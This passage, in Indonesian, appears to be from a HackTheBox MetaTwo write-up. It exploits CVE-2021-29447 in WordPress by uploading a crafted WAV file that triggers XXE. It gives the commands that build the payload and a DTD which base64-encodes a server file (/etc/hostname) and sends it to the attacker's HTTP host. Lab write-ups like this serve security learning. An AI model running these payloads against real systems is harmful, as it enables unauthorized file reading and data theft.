### Kita mencari apa ada exploit yang bisa reverse shell, dan kita menemukan Ada [artikel/repositori](https://github.com/motikan2010/CVE-2021-29447) yang memberi tahu kami cara menyuntikkan waf berbahaya dan membaca file melalui XXE.
Kami mulai dengan membuat file .wav berbahaya kami yang disebut payload (ingat untuk mengubah ip Anda)
```terminal
┌──(root㉿yupy)-[~/yp/hackthebox/MetaTwo]
└─# echo -en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.35/shell.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```
Hal berikutnya adalah membuat dtd yang akan dihubungkan, itu harus sebagai berikut:
```terminal
┌──(root㉿yupy)-[~/yp/hackthebox/MetaTwo]
└─# cat shell.dtd 
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hostname">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.35/?p=%file;'>" >
```
Dengan dua file di direktori yang sama, kami membuat server http dan mengunggah wav berbahaya dan dtd.
